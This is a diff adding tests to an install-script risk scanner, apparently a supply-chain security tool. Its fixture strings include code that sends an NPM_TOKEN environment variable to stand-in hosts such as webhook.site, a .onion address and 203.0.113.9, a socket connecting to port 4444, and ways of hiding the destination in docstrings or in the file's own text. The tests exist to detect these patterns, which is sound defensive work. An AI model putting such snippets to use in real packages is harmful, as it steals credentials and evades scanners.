@@ -292,3 +292,86 @@ test("a fetch through a fallback from a parameter keeps unknown startup readings
     + "  return fetchFn('https://files.invalid/p').then((r) => r.text()).then((t) => eval(t));\n}\nload();\n";
   assert.ok(risk(load).includes("runs code it receives over the network"));
 });
+
+test("where a send goes is read in the code, not in its comments (D-22)", () => {
+  // inspect-ai's view bundle "contacts an address typical of data exfiltration (.onion)" from linkify-it's doc
+  // comment, named once a send was found (Python twin: AddressLabelTests)
+  const LABEL = "contacts an address typical of data exfiltration";
+  const labels = (text, lang) => installScriptRisk(text, true, false, lang).filter((r) => r.startsWith(LABEL));
+  const js = (host) => `const v = process.env.NPM_TOKEN;\nfetch('${host}/c', { method: 'POST', body: v });\n`;
+  const py = (host) => `import os, requests\nrequests.post('${host}/c', data=os.environ['NPM_TOKEN'])\n`;
+  const send = js("https://collect.invalid");
+  assert.deepEqual(installScriptRisk(send, true, false, "js"), ["sends environment variables over the network (NPM_TOKEN)"]);
+  for (const comment of ["// linkify.tlds('onion', true) // add the unofficial `.onion` domain\n",
+    "/* a capture service for tests: https://webhook.site/0000 */\n", "// a mirror: http://203.0.113.9/files\n"]) {
+    assert.deepEqual(labels(comment + send, "js"), [], comment);
+    assert.deepEqual(labels("#!/usr/bin/env node\n" + comment + send, null), [], comment);
+  }
+  for (const prose of ["# results also go to https://webhook.site/0000\n", "\"\"\"Uploads to pipedream.net when asked.\"\"\"\n",
+    "# a mirror: http://203.0.113.9/files\n"]) {
+    assert.deepEqual(labels(prose + py("https://collect.invalid"), "py"), [], prose);
+  }
+  for (const [text, lang, shown] of [[js("https://abcdefghijklmnop.onion"), "js", ".onion"],
+    [js("https://webhook.site"), "js", "webhook.site"], [js("http://203.0.113.9"), "js", "http://203.0.113.9"],
+    ["const doc = 'see example.onion';\n" + send, "js", ".onion"],
+    ["/* tests: https://webhook.site/0000 */\n" + js("https://abcdefghijklmnop.onion"), "js", ".onion"],
+    [py("https://webhook.site"), "py", "webhook.site"],
+    [py("http://203.0.113.9"), "py", "http://203.0.113.9"]]) {
+    assert.deepEqual(labels(text, lang), [`${LABEL} (${shown})`], shown);
+  }
+  // reworked after an independent review (its HIGH-3): prose the code may read back is read as it is — a docstring
+  // read back, a function's source, its own file; the raw IP address is a reason of its own, with no send
+  const doc = 'def where():\n    """http://203.0.113.9/p"""\n';
+  const tail = "\nconst u = where.toString().slice(23, -3);\nrequire('http').get(u);\n";
+  for (const [text, lang] of [["import urllib.request\n" + doc + "urllib.request.urlopen(where.__doc__)\n", "py"],
+    ['import urllib.request\nclass Cfg:\n    """http://203.0.113.9/p"""\nurllib.request.urlopen(Cfg.__doc__)\n', "py"],
+    ["import inspect, urllib.request\n" + doc + "urllib.request.urlopen(inspect.getdoc(where))\n", "py"],
+    ["# http://203.0.113.9/p\nimport urllib.request\nurllib.request.urlopen(open(__file__).readline()[2:].strip())\n", "py"],
+    ["function where() {/*http://203.0.113.9/p*/}" + tail, "js"],
+    ["function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "String(where)"), "js"],
+    ["function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "`${where}`"), "js"],
+    ["// http://203.0.113.9/p\nconst fs = require('fs');\nconst u = fs.readFileSync('install.js', 'utf8').split('\\n')[0].slice(3);\n"
+      + "require('http').get(u);\n", "js"]]) {
+    assert.deepEqual(labels(text, lang), [`${LABEL} (http://203.0.113.9)`], text);
+  }
+  const sock = 'import socket\ndef where():\n    """203.0.113.9"""\ns = socket.socket()\ns.connect((where.__doc__, 4444))\n';
+  assert.deepEqual(installScriptRisk(sock, true, false, "py"), [`${LABEL} (203.0.113.9)`]);
+  const env = 'import os, requests\ndef where():\n    """https://webhook.site/0000"""\n'
+    + "requests.post(where.__doc__, data=os.environ['NPM_TOKEN'])\n";
+  assert.deepEqual(labels(env, "py"), [`${LABEL} (webhook.site)`]);
+});
+
+test("unknown self reads and failed Python retain raw addresses (D-22 v3)", () => {
+  for (const [lang, text] of [
+  [
+    "js",
+    "// http://203.0.113.9/p\nconst fs=require(\"fs\");const name=[\"install\",\"js\"].join(\".\");const u=fs.readFileSync(name,\"utf8\").split(\"\\n\")[0].slice(3);require(\"http\").get(u);"
+  ],
+  [
+    "js",
+    "// http://203.0.113.9/p\nconst fs=require(\"fs\");const [,name]=process.argv;const u=fs.readFileSync(name,\"utf8\");require(\"http\").get(u);"
+  ],
+  [
+    "js",
+    "// http://203.0.113.9/p\nconst f=require(\"fs\");const r=f[\"read\"+\"FileSync\"];require(\"http\").get(r(name,\"utf8\"));"
+  ],
+  [
+    "py",
+    "# http://203.0.113.9/p\nimport sys, urllib.request\nu=open(sys.argv[:1][0]).readline()[2:].strip()\nurllib.request.urlopen(u)"
+  ],
+  [
+    "py",
+    "# http://203.0.113.9/p\nimport urllib.request\nu=open(\".\".join([\"install\",\"py\"])).readline()[2:].strip()\nurllib.request.urlopen(u)"
+  ],
+  [
+    "py",
+    "# http://203.0.113.9/p\nx = ("
+  ],
+  [
+    "py",
+    "# http://203.0.113.9/p\nx = \"unterminated"
+  ]
+]) {
+    assert.ok(installScriptRisk(text, true, false, lang).includes("contacts an address typical of data exfiltration (http://203.0.113.9)"), text);
+  }
+});
